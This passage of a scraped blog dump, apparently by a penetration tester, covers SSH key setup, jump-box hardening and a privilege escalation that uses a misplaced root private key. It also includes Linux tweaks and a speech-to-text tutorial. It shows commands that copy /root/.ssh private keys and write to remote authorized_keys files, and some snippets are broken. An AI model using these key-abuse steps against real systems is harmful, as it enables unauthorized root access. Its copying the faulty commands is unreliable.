KDE Plasma 5.20.5 at the time of this article. If you are using version 4.x KDE, then the instructions may be different. ***\n\nMost articles on removing these update checks involve turning off notifications, which doesn't actually stop the action. It just stops notifying you. Other display managers have graphical user interfaces where such settings easily turn off through a GUI. The KDE offers a powerful tool in \"System Settings\" (\"Startup and Shutdown\" -> \"Autostart\") for managing your personal autostart services; however, it doesn't cover systemwide autostart scripts provided by your distribution packages or created by the gnome apps.\n\n<img src=\"/static/75bca62b-9dfa-4588-a83c-c80dba38d18a.png\" class=\"img-fluid\" alt=\"\">\n\nThis is how it looks on a new installation (see picture below) empty.  I should point out that this is a powerful feature, and on my pentest system, I utilise this a lot. \n\n<img src=\"/static/ee8fa3ee-597d-43a1-aec6-ae9693d562c8.png\" class=\"img-fluid\" alt=\"\">\n\nSo now I have shown you an empty AutoStart screen and explained that KDE does not show systemwide scripts provided by your distribution or gnome apps! Where do you go to turn off these updates? The terminal, of course! \n\nHere is our friend!\n\n<img src=\"/static/16ba87d8-007d-4d0c-8d87-05e24389c85c.png\" class=\"img-fluid\" alt=\"\">\n\n\nYou can now delete the file altogether, be a big boy, and manage your own system updates. \n```\nsudo rm /etc/xdg/autostart/parrot-updater.desktop\n```"},{"fields":{"slug":"/penetrate-report-repeat"},"excerpt":"","frontmatter":{"date":"28th April 2021 ","title":"Penetrate. Report. Repeat","description":"","tags":null,"posttype":"article"},"body":""},{"fields":{"slug":"/linux-priv-escalation-and-lateral-movement-with-ssh-keys"},"excerpt":null,"frontmatter":{"date":"25th April 2021 ","title":"Linux Priv Escalation and Lateral Movement With SSH Keys","description":"","tags":null,"posttype":"article"},"body":"* This article will be split up into two parts. In the first part we will look at the SSH service, its native files and commands and good practices around using it. \n* The second part we will look at abusing many configurations. \n* For the examples in this article, I am going to boot up two Debian servers on Vultr.\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/02dbb41a-7a5c-450a-a3a2-b008eb0a6e7f.png\" class=\"img-fluid\" alt=\"\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">System Preferences.</figcaption>\n</figure>\n\nBoth Servers are version Debian 10 x64 (aka buster)\n\n* I have named the hostname of the two server demo1 and demo2 to make it easy to discern between them\n* When I first log in it asks if I want to accept the fingerprint which in this case is: \"ECDSA key fingerprint is SHA256:du2f5e/Zux+XxuWWS/XdAc0ypC1OeAv5tGWUhWnaCSk\". \n* Make a mental note of that as we will be coming back to that later on in this article. \n* As this article is going to be on SSH keys I am going to start by generating a pair. \n\n## Generating an SSH Keypair\n\nThis is not an article on server setup so I am not going to go into great detail. \n\nI am going to run the following command\n```\nssh-keygen -t RSA -b 4096\n```\n> The `-t` specifies the type and the `-b` the number of bits of entropy. \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/2f088f7e-c9cf-4302-9d0e-4ebec9b3ac1b.png\" class=\"img-fluid\" alt=\"\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">System Preferences.</figcaption>\n</figure>\n\n> Notice the fingerprint SHA256:ALLUbdUShgY5OJztlLokHF7cv8o1vooMPwJCvNti3z8\n\n\n## Looking at the SSH Dameon configuration \n\n\nLet us open the configuration \n```\nnano /etc/ssh/sshd_config\n```\n\n\nLet us specifically look at the options that are commented out!\n```\ncat /etc/ssh/sshd_config  | grep -E \"^#\"\n```\n\nThe following were the default options found on this newly booted Vultr Debian server:\n\n```\n/#       $OpenBSD: sshd_config,v 1.103 2018/04/09 20:41:22 tj Exp $\n/# This is the sshd server system-wide configuration file.  See\n/# sshd_config(5) for more information.\n/# This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin\n/# The strategy used for options in the default sshd_config shipped with\n/# OpenSSH is to specify options with their default value where\n/# possible, but leave them commented.  Uncommented options override the\n/# default value.\n/# Port 22\n/# AddressFamily any\n/# ListenAddress 0.0.0.0\n/# ListenAddress ::\n/# HostKey /etc/ssh/ssh_host_rsa_key\n/# HostKey /etc/ssh/ssh_host_ecdsa_key\n/# HostKey /etc/ssh/ssh_host_ed25519_key\n/# Ciphers and keying\n/# RekeyLimit default none\n/# Logging\n/# SyslogFacility AUTH\n/# LogLevel INFO\n/#  Authentication:\n/# LoginGraceTime 2m\n/# StrictModes yes\n/# MaxAuthTries 6\n/# MaxSessions 10\n/# PubkeyAuthentication yes\n/# Expect .ssh/authorized_keys2 to be disregarded by default in future.\n/# AuthorizedKeysFile     .ssh/authorized_keys .ssh/authorized_keys2\n/# AuthorizedPrincipalsFile none\n/# AuthorizedKeysCommand none\n/# AuthorizedKeysCommandUser nobody\n/# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts\n/# HostbasedAuthentication no\n/# Change to yes if you don't trust ~/.ssh/known_hosts for\n/# HostbasedAuthentication\n/# IgnoreUserKnownHosts no\n/# Don't read the user's ~/.rhosts and ~/.shosts files\n/# IgnoreRhosts yes\n/#  To disable tunneled clear text passwords, change to no here!\n/# PasswordAuthentication yes\n/# PermitEmptyPasswords no\n/# Change to yes to enable challenge-response passwords (beware issues with\n/# some PAM modules and threads)\n/# Kerberos options\n/# KerberosAuthentication no\n/# KerberosOrLocalPasswd yes\n/# KerberosTicketCleanup yes\n/# KerberosGetAFSToken no\n/# GSSAPI options\n/# GSSAPIAuthentication no\n/# GSSAPICleanupCredentials yes\n/# GSSAPIStrictAcceptorCheck yes\n/# GSSAPIKeyExchange no\n/# Set this to 'yes' to enable PAM authentication, account processing,\n/# and session processing. If this is enabled, PAM authentication will\n/# be allowed through the ChallengeResponseAuthentication and\n/# PasswordAuthentication.  Depending on your PAM configuration,\n/# PAM authentication via ChallengeResponseAuthentication may bypass\n/# the setting of \"PermitRootLogin without-password\".\n/# If you just want the PAM account and session checks to run without\n/# PAM authentication, then enable this but set PasswordAuthentication\n/# and ChallengeResponseAuthentication to 'no'.\n/# AllowAgentForwarding yes\n/# AllowTcpForwarding yes\n/# GatewayPorts no\n/# X11DisplayOffset 10\n/# X11UseLocalhost yes\n/# PermitTTY yes\n/# PrintLastLog yes\n/# TCPKeepAlive yes\n/# PermitUserEnvironment no\n/# Compression delayed\n/# ClientAliveInterval 0\n/# ClientAliveCountMax 3\n/# UseDNS no\n/# PidFile /var/run/sshd.pid\n/# MaxStartups 10:30:100\n/# PermitTunnel no\n/# ChrootDirectory none\n/# VersionAddendum none\n/# no default banner path\n/# Banner none\n/# Allow client to pass locale environment variables\n/# override default of no subsystems\n/# Example of overriding settings on a per-user basis\n/#Match User anoncvs\n/#       X11Forwarding no\n/#       AllowTcpForwarding no\n/#      PermitTTY no\n/#       ForceCommand cvs server\n```\n\nIf it is not clear to anyone reading this! the lines starting with the `#` have been commented out. \n\nLet us have a look at the keys we just generated \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/f3a65f26-d0a9-4688-99cd-5823f09a3b93.png\" class=\"img-fluid\" alt=\"\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">System Preferences.</figcaption>\n</figure>\n\nthe `~` is the shortcut symbol to the users home directory. We follow this with a `.` and then the name of the  SSH folder (note lowercase). \n\n> The SSH folder starts with a `.` as it  is a hidden folder.\n\nLooking at the screenshot we can see by just accepting defaults and pressing through the `ssh-keygen` command we have a public and private key in their default place (the users directory) and they have the appropriate permissions set. \n\nNow for the next part of this article we are going to want the exact same key pair on the `demo2` machine. \n\nFirst though let us see one more use of the `ssh-keygen` command. Remember that SHA1 fingerprint from earlier. \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/999b1e82-eb1a-4107-9056-4a7add0c7326.png\" class=\"img-fluid\" alt=\"\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">System Preferences.</figcaption>\n</figure>\n\nSo buy running `ssh-keygen -l -v -f` and pointing it as either the public or private key we can confirm that the fingerprint show matches the one generated. \n\n> MD5 is not recommended these days due to potential collisions however if you need to test fingerprints as MD5 you can use the following\n\n```\n&num; get the MD5 for private key\nopenssl pkey -in /path/to/privatekey -pubout -outform DER | openssl md5 -c\n\n&num; get the MD5 for public key\nopenssl pkey -in /path/to/publickey -pubin -pubout -outform DER | openssl md5 -\n```\n\n## Copying Keys To Another Server\n\nFirst I want to clarify some common mistakes. I know of other consultants who have thought they could use the following command to add the keys to another server. \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/f16d3f8a-372b-49b3-8476-7ffd8458346f.png\" class=\"img-fluid\" alt=\"\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">System Preferences.</figcaption>\n</figure>\n\nOkay there is a  lot happening in this picture and I want to break some of it down. \n\nFirstly I have changed directory to the root of the server `cd /` to show you do not need to be in the same folder as the keys to use this command. Secondly we can see the servers current fingerprint just like we did with the first server. Notice the server fingerprint is not the same and any fingerprints we have generated or seen so far. If we look further down we can see that the first time I had to manually authenticate to the sever and then we can see that the number of key(s) copied were \"Number of key(s) added: 1\". \n\nLet us have a look what is going on.  \n\n> Please note I have already SSH to the box so no fingerprint for me to accept in this screenshot. \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/a2d5285c-008f-4c1e-83a0-adc00aead2d3.png\" class=\"img-fluid\" alt=\"\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">System Preferences.</figcaption>\n</figure>\n\nNow let us examine the `.ssh` folder\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/6ead762c-7d59-4ac3-a5b3-25d423962665.png\" class=\"img-fluid\" alt=\"\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">System Preferences.</figcaption>\n</figure>\n\n* not keys have been copied across as the name in the command might suggest. \n* the public key on demo1 has been added into the `authorized_keys` on demo2 but the `id_rsa` private key and `id_rsa.pub` key were not transferred.\n* Once an SSH key has been created, the ssh-copy-id command can be used to install it as an authorized key on the server. Once the key has been authorized for SSH, it grants access to the server without a password. That's its function. \n\n\nSo know we have seen that the function of `ssh-copy-id` and how it does it job there should be little reason to worry about placing keys and authorized file entries into golden build images. You spin the server and then the admin (demo1) in this situation uses the  `ssh-copy-id`. \n\n## Let us look at an alternative, up comes box 3.\n\nThe admin has a new machine deployed on his network. For the sake of simplicity, we have called it \"demo3\". \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/a18fe094-7160-40da-9e2c-993576244135.png\" class=\"img-fluid\" alt=\"\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">System Preferences.</figcaption>\n</figure>\n\nWith server 3 booted the admin on host \"demo1\" wants to be able to SSH into demo3. We know that the admins public key hosted on demo one needs to be placed inside the authorized keys of demo3.\n\nJust for excitement as so you keep learning something new as you read. Let us not use the `ssh-copy-id` command. \n```\ncat id_rsa.pub | ssh root@95.179.138.81 'cat > ~/.ssh/authorized_keys'\ncat ~/.ssh/id_rsa.pub | ssh root@95.179.138.81 'cat >> ~/.ssh/authorized_keys'\n```\n\nTwo things should be noted. This time we do need to be in the directory of the SSH Public key folder or we need to put in an explicit path as in example two.  The aim here is to to `cat` the public key and pipe it to the authorized keys. \n\nWe have two problems, however! 1) We don't even know if this file exists yet which will result in an error. Secondly, it may be exist and have keys already in it that we don't want to overwrite with a single \">\" symbol.\n\nIf we just want SSH to run a command and return we can list it as the end of the ssh command. \n\n```\nssh root@95.179.138.81 'ls -Rl ~/'\n```\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/a8a4d6bd-3365-468d-b8d0-1178fd662187.png\" class=\"img-fluid\" alt=\"\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">System Preferences.</figcaption>\n</figure>\n\nAs we can see, the root folder is pretty empty and so out command would result in error unless we made a directory first. Now we have started this was we will continue but I just wanted to highligh some of the extra steps the `ssh-copy-id` command takes care of such as create the folders, files and getting the permissions right. However lets proceed.\n\nLets make the folder using the `-p` that creates any directories needed along the way. \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/2d66bf01-f47e-4ac8-9552-67f513418529.png\" class=\"img-fluid\" alt=\"\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">System Preferences.</figcaption>\n</figure>\n\nNow lets copy the public key across. \n\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/be001666-6d2a-43bf-b561-046d20dc6e66.png\" class=\"img-fluid\" alt=\"\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">System Preferences.</figcaption>\n</figure>\n\nSo with the public key copied across, albeit a lot more work we should be in a position to SSH into that server without a password.  It should be noted at this point we have a reasonably secure configuration with \"demo1\" being able to access \"demo2\" and \"demo3\". \n\nIt should be noted that \"demo3\" could still connect back to \"demo1\" with a password. Not this might be behavior that is needed but if \"demo1\" is a jump box to other machines in the network we may want to harden \"demo1\" by adjust the config. \n\nPassword authentication defaults to \"yes\", don't want to lock yourself out of a box by accident now do we. Note, even though the field is not set and commented out it shows us the default behavior. \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/9c72444d-3604-49fd-ab40-f57556edcce4.png\" class=\"img-fluid\" alt=\"\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">System Preferences.</figcaption>\n</figure>\n\nNow before I change around with config and potentially lock myself out of my admin jump box \"demo1\" I need to remember two things. Firstly I need the private key to log in. This can be grabbed from the local system by using the `scp` command. \n```\nscp root@demo1:/root/.ssh/*\n```\n\nI will get asked for my password but I will have my precious keys. However I STILL wont be able to login. The more observant of you by this point should be screaming your authorized_key file is missing. \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/9fe2c9c7-8921-47df-8464-4278e5a89ecc.png\" class=\"img-fluid\" alt=\"\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">System Preferences.</figcaption>\n</figure>\n\nWe can run the `ssh-copy-id` on localhost but notice we still need to log in. \n\nWith that complete, we can edit the ssh configuration to stop password login from other boxes. This helps secure our jump box. \n\n```\nnano /etc/ssh/sshd_config\n```\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/05b0645f-745f-4bd9-8cd8-742a7c0ad99d.png\" class=\"img-fluid\" alt=\"\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">System Preferences.</figcaption>\n</figure>\n\nLet us uncomment that line and change it to no. Now Demo2 and Demo3 could not ssh to us without a private key and even if they brute forced the correct password for the root user it would not let them connect. \n\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/943e88e6-819d-4652-917b-76f171792883.png\" class=\"img-fluid\" alt=\"\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">System Preferences.</figcaption>\n</figure>\n\nLets restart the service and try it out.  \n```\nsystemctl restart sshd\n```\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/2f040ccb-60c0-4cf6-8790-af306cac9a7b.png\" class=\"img-fluid\" alt=\"\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">System Preferences.</figcaption>\n</figure>\n\nNo prompt for a password and a message saying permission denied, something we have all seen on pentests. \n\n\n## What is the known host\n\nWhen we press \"yes\" to accept the fingerprints of servers that we login to their corresponding entries get added to `known_hosts`. If a server fingerprint changes for any one of a number of reasons and it no longer matches what is in the known host we get a warning next time we try and connect to that server. \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/fcfbb795-e111-4cb9-b473-2f2bb019eee4.png\" class=\"img-fluid\" alt=\"\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">System Preferences.</figcaption>\n</figure>\n\nLets force one now \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/4d5566f9-622a-4f29-b196-829a93e9cc3e.png\" class=\"img-fluid\" alt=\"\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">System Preferences.</figcaption>\n</figure>\n\nso despite connecting to that machine multiple times before we know have to once again accept the warning..... \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/d00b4621-de90-4a96-b46f-a37ba02fb13c.png\" class=\"img-fluid\" alt=\"\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">System Preferences.</figcaption>\n</figure>\n\nWhen administering a lot of servers from your jump box, pressing yes all the time could end up being quite annoying. Is there another way?\n\n# Enter `sshkey-scan`\n\nSo lets have a look at this useful tool. I will admit in out three machine setup it is overkill but it does let us look at the options a bit easier. \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/243b3a86-cedc-48cc-ab8a-69a4423f7f1d.png\" class=\"img-fluid\" alt=\"\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">System Preferences.</figcaption>\n</figure>\n\nSo what is going on here! First, we can see the format of the original known_host file (the one I modified with 'l33t'). \n\nI have then emptied out the known host file due to the fact we are about to fill it. Please note that the known_host file hasnt been filled yet as we still have to redirect out command back into the the file. Before we get that far lets have a look when we don't give `ssh-keyscan` a format for the known host file. Each IP I gave it was submitted as ed25519, ssh-rsa, ecdsa, and ed25519. In addition it fingerprints the end server boxes for their IP, ports and their operating system version and leaves it as a comment before each entry. This makes this a rather useful tool. \n\nIf you have more than the few machines that I have here then you can supply them as a file with the `-f` option. \n\n> Note, make sure you include machines you trust and you know haven't been compromised. Regenerating the known hosts will remote the warning telling you if a host has changed since you last approved it so double check. \n\nLets create out known host file and check it out. \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/7db3a1b7-9276-4a9e-8463-b824f30514b3.png\" class=\"img-fluid\" alt=\"\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">System Preferences.</figcaption>\n</figure>\n\nso let us run out command and see if we can login with no warning. \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/b0417e4f-4dea-4e36-9391-709dbe3c562d.png\" class=\"img-fluid\" alt=\"\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">System Preferences.</figcaption>\n</figure>\n\nNow before I finish part one of this article; I do appreciate you staying with me while we go through the some of the configuration of the process. I just want to show you one more thing for the lazy admin... like me!\n\n## Config\n\nThe local SSH Config can allow us to do some very complex things. We will only cover some of the really useful features here\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/bd5c27cf-637c-41d5-b31c-09f91b7537be.png\" class=\"img-fluid\" alt=\"\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">System Preferences.</figcaption>\n</figure>\n\nMy \"config\" file for my jumpbox on demo1\n\n```\nHost demo2\n        HostName 78.141.216.246\n        User root\n\nHost demo3\n        HostName 95.179.138.81\n        User root\n```\n\nNow with just `ssh demo2` it replaces `ssh root@78.141.216.246`\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/de62bb13-f3c3-4dcb-ab34-8a5935e1c437.png\" class=\"img-fluid\" alt=\"\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">System Preferences.</figcaption>\n</figure>\n\n## Summary\n\nIn this first article, we looked at some of the SSH commands responsible for deployed Private Key Infrastructure with SSH. We look at a reasonable good practice with regards to making a jump box and got a general understanding of the difference between the config file, the known_hosts file, the authorized_keys and the public and private key. \n\nIn the second part of this article, we will expand on part one and go deeper into some of the configuration options and how they are often misconfigured to allow lateral movement, and complete network pwnage. I would however feel I miss-sold you on the title of the article if I didn't show you one basic privilege escalation trick. \n\nIn the screenshot below the admin has backup his private key to a folder with the wrong permissions. Debbie has come along and found this key and has SSH into the host she is on.  Debbie is now the `root` user and has a stable shell.\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/8085e373-485d-4bb1-92b9-af14ef43901d.png\" class=\"img-fluid\" alt=\"\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">System Preferences.</figcaption>\n</figure>\n\nThis trick was a little contrived but comes up frequently in capture the flag events. \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/7fe3301b-18a6-425a-9f7d-6a66770607df.png\" class=\"img-fluid\" alt=\"\">\n  <figcaption class=\"figure-caption text-center fw-normal text-dark\">System Preferences.</figcaption>\n</figure>\n\nTry and wrap your head around the basics we talked about today. Next article we will look at SSH Server configuration in detail and the things that often go wrong, we will look at piping tools through SSH, creating tunnels, moving laterally and will talk a lot more about SSH fingerprinting and how it can help us increase the attack surface."},{"fields":{"slug":"/beginner-guide-to-apt-commands"},"excerpt":"Little history of how apt works? What are sources?\n\nUpdating sources?\n\nSearching for packages\n\nShow information about the package\n\nFinding…","frontmatter":{"date":"24th April 2021 ","title":"Beginner Guide To APT Commands","description":"","tags":"apt, aptidude","posttype":"article"},"body":"Little history of how apt works?\n\nWhat are sources?\n\nUpdating sources?\n\nSearching for packages \n\nShow information about the package \n\nFinding packages installed on your machine\n\nFinding packages that are upgradeable \n\nautoremove and autoClean"},{"fields":{"slug":"/the-many-hats-of-a-pentester"},"excerpt":"Hat One - Technical Hat Two - Be able to write well\n\nHat Three - Present to a diverse audience","frontmatter":{"date":"24th April 2021 ","title":"The Many Hats Of A Pentester","description":"","tags":"soft-skills, pentester","posttype":"article"},"body":"Hat One - Technical\n\nHat Two - Be able to write well\n\nHat Three - Present to a diverse audience"},{"fields":{"slug":"/covert-voice-in-a-video-to-text"},"excerpt":null,"frontmatter":{"date":"24th April 2021 ","title":"Covert Voice In A Video To Text","description":"","tags":"voice, convert","posttype":"tutorial"},"body":"Have you ever wanted to extract the text from a video file? There are a number of software packages and transcription services flooding the search engines and it can be hard to pick a piece of software or a service. \n\nAs a programmer my preferred choice to this solution was to script something myself using the Google Cloud Speech-to-Text service. \n \nThis tutorial will demonstrate how to transcribe short video files ( less than 1 minute) using synchronous speech recognition and long audio files (longer than 1 minute) to text using asynchronous speech recognition.\n\nWe will look at doing this with Python and Curl. \n\nTwo methods, RPC and REST. RPC takes in binary audio files however REST submits JSON and so we need to convert out file into base64 if we want to send it from out local machine. \n\n\n<h5 class=\"step\">1. Downloading an API key for the Speech-to-Text service</h5>\n\nFirst we sign up for an Google Cloud Web Services and download an API key for the Speech-to-Text service\n\nIn order to do this there are a few prerequisites: \n\n* [Set Up a Speech-to-Text Project](https://cloud.google.com/speech-to-text/docs/quickstart-client-libraries) in the Google Cloud Console. \n* You've set up your environment using [Application Default Credentials](https://cloud.google.com/speech-to-text/docs/quickstart-client-libraries) in the Google Cloud Console.\n\n<h5 class=\"step\">2. Creating a Virtual Environment </h5>\n\n> For the purpose of this tutorial we are going to start using the python client libraries however if you don't wish to install the python libraries then it is possible to use the built in Curl command which will also demonstrate later on in this article as an alternative. \n\nWith our API key downloaded we need to write some code. Due to the fact that we will be installing python modules we should start off by creating a python virtual environment to keep the libraries contained from interfering with that of the system. \n```\ncd ~\nmkdir converter\ncd converter\napt-get install python3-venv\n```\n\nIf you get an error creating the environment you may need to install the following package\n```\napt-get install python3-venv\n```\n\nWith our virtual environment created we need to activate it. \n```\nsource venv/bin/activate\n```\n\n<h5 class=\"step\">3. Installing the Google Cloud Speech module for Python</h5>\n\nWith the environment activated. Install the following python client library. \n```\npip install --upgrade google-cloud-speech\n```\n\n<h5 class=\"step\">4. Set an Environmental Variable to point to the API key</h5>\n\t\t\nNext, place the downloaded API key in the projects directory. You do not need to keep the default name, you can call it anything you want. I have decided to rename mine to `config.json`\n\n<img src=\"/static/cf20d2a3-e0cd-4d8b-87d9-6fc0c8a2c5f2.png\" class=\"img-fluid\" alt=\"\">\n\nNext Step, set the environment variable for the config file.\n```\nexport GOOGLE_APPLICATION_CREDENTIALS=\"/home/evilsaint/converter/config.json\"\n```\n\n<h5 class=\"step\">5. Extracting the Audio</h5>\n\nNext we extract the audio as the visual element is unneeded for the the conversion.  Run the following command to covert your file. \n```\nffmpeg -i <video-input-file.mp4> <audio-output-file.wav>\n```\n> Before proceeding to the next step it is a good idea to play the audio file (at least in part) to check the audio conversion worked?\n\nAssuming you are happy with the playback you can now proceed to the next step. \n\n\n<h5 class=\"step\">6. Downloading Google Cloud Speech Sample Application Code</h5>\n\nDownload the following file. \n```\nwget https://raw.githubusercontent.com/googleapis/python-speech/master/samples/snippets/transcribe_async.py\n```\n\n\n<h5 class=\"step\">7. Customise transcribe_async.py for the WAV</h5> \n\n\nDue to the fact we are using `WAV` files we either need to admit the following line or specify 44100.\n\n```\nsample_rate_hertz=16000\n```\n\nEdit the following lines for the Google Cloud Bucket and the local file functions. \n```\nnano -l transcribe_async.py\n```\n\n<img src=\"/static/f943465c-0866-48a2-be78-037f02b45b4c.png\" class=\"img-fluid\" alt=\"\">\n\n<img src=\"/static/3317f1c2-cd2e-4f04-8385-98117a818cca.png\" class=\"img-fluid\" alt=\"\">\n\n\nBecause the WAV file I have contains two channels I am going to modify the audio channel config and also the encoding. \n```\n    config = speech.RecognitionConfig(\n        encoding='LINEAR16',\n        sample_rate_hertz=44100,\n        language_code=\"en-US\",\n        audio_channel_count=2,\n    )\n```\n\n<h5 class=\"step\">8. Hosting the File In The Cloud (Optional)</h5>\n\n\nOne of the easiest ways to host the audio files is to upload them go you Google Cloud Platform (GCP) bucket. \n\n> You must have proper access permissions to read Google Cloud Storage files, such as one of the following:\n * Publicly readable (such as our sample audio files)\n * Readable by your service account, if using service account authorization.\n * Readable by a user account, if using 3-legged OAuth for user account authorization.\n\n\n<img src=\"/static/0f752dd2-687c-4509-8cab-dbfbc1a1c6da.png\" class=\"img-fluid\" alt=\"\">\n\n\n<h5 class=\"step\">9. Convert The File</h5>\n\nNow we can convert our file from the cloud\n```\npython transcribe_async.py gs://evilsaint/audio-output.wav\n```\n\n<img src=\"/static/e126cd77-7708-40ab-b407-e67de97ee5a1.png\" class=\"img-fluid\" alt=\"\">\n\nOr we can convert the file locally. \n```\npython transcribe_async.py audio-output.wav \n```\n\n\n# Using Curl\n\n\n\n<h5 class=\"step\">1. Converting the Audio to a Text File</h5>\n\nNext we need to covert our audio file to base64 before we can send it to the \"Speech-to-Text\" API from the local system. This is not needed if you are sending the file from the GPC bucket. \n```\nbase64 audio-output.wav -w 0 > audio-data.txt\n```\n\n\n<h5 class=\"step\">2. Constructing the Curl command</h5>\n\n\nMake a request.json file\n```\ntouch request.json\n```\n\nEdit the file\n```\nnano request.json\n```\n\nInside the file we can do \n```\n{\n  \"config\": {\n        \"encoding\":\"LINEAR16\",\n        \"sample_rate_hertz\":\"44100\",\n        \"language_code\":\"en-US\",\n        \"audio_channel_count\":\"2\",\n  },\n  \"audio\": {\n      \"uri\":\"gs://evilsaint/audio-output.wav\"\n  }\n}\n```\n\nAnd make a curl command like so\n```\n\n```\n\n\n\n\n\n\n\n\n\n\n  446  mv request.json sync-request.json\n  447  cat sync-request.json \n  448  curl -s -H \"Content-Type: application/json\"     -H \"Authorization: Bearer \"$(gcloud auth application-default print-access-token)     https://speech.googleapis.com/v1/speech:recognize     -d @sync-request.json\n  449  echo \"deb [signed-by=/usr/share/keyrings/cloud.google.gpg] https://packages.cloud.google.com/apt cloud-sdk main\" | sudo tee -a /etc/apt/sources.list.d/google-cloud-sdk.list\n  450  sudo apt-get install apt-transport-https ca-certificates gnupg\n  451  curl https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key --keyring /usr/share/keyrings/cloud.google.gpg add -\n  452  sudo apt-get update && sudo apt-get install google-cloud-sdk\n  453  sudo apt-get install google-cloud-sdk-app-engine-java\n  454  gcloud init\n  455  gcloud init --skip-diagnostics\n  456  history\n\n```\ncat sync-request.json \n{\n  \"config\": {\n        \"encoding\":\"LINEAR16\",\n        \"sample_rate_hertz\":\"44100\",\n        \"language_code\":\"en-US\",\n        \"audio_channel_count\":\"2\",\n  },\n  \"audio\": {\n      \"uri\":\"gs://evilsaint/audio-output.wav\"\n  }\n}\n```\n\n\n```\ncurl -s -H \"Content-Type: application/json\"     -H \"Authorization: Bearer \"$(gcloud auth application-default print-access-token)     https://speech.googleapis.com/v1/speech:recognize     -d @sync-request.json\n```\n\n\n\n\n{\n  \"error\": {\n    \"code\": 400,\n    \"message\": \"Sync input too long. For audio longer than 1 min use LongRunningRecognize with a 'uri' parameter.\",\n    \"status\": \"INVALID_ARGUMENT\"\n  }\n}\n\n\n```\ncurl -s -H \"Content-Type: application/json\"     -H \"Authorization: Bearer \"$(gcloud auth application-default print-access-token)     https://speech.googleapis.com/v1/speech:longrunningrecognize     -d @sync-request.json\n```\n\n\n\n```\ncurl -s -H \"Content-Type: application/json\"     -H \"Authorization: Bearer \"$(gcloud auth application-default print-access-token)     https://speech.googleapis.com/v1/speech:longrunningrecognize     -d @sync-request.json\n{\n  \"name\": \"1211050700785987050\"\n}\n```\n\nMaybe\n```\ncurl -s -H \"Content-Type: application/json\"     -H \"Authorization: Bearer \"$(gcloud auth application-default print-access-token) https://speech.googleapis.com/v1/operations/1211050700785987050 \n```\n\n\n<img src=\"/static/9fc6cb8c-f6f5-4041-b83b-32b8562179d3.png\" class=\"img-fluid\" alt=\"\">"},{"fields":{"slug":"/hp-smart-app-forcing-account-creation-to-use-basic-functionality"},"excerpt":null,"frontmatter":{"date":"21st April 2021 ","title":"HP Smart App Forcing Account Creation To Use Basic Functionality","description":"Remote HP Smart App","tags":null,"posttype":"blog"},"body":"\n## Remote HP Smart App\n\nRight-click on the Start button or press the `Windows key` + `X` keyboard combination. When the menu opens, select Apps and 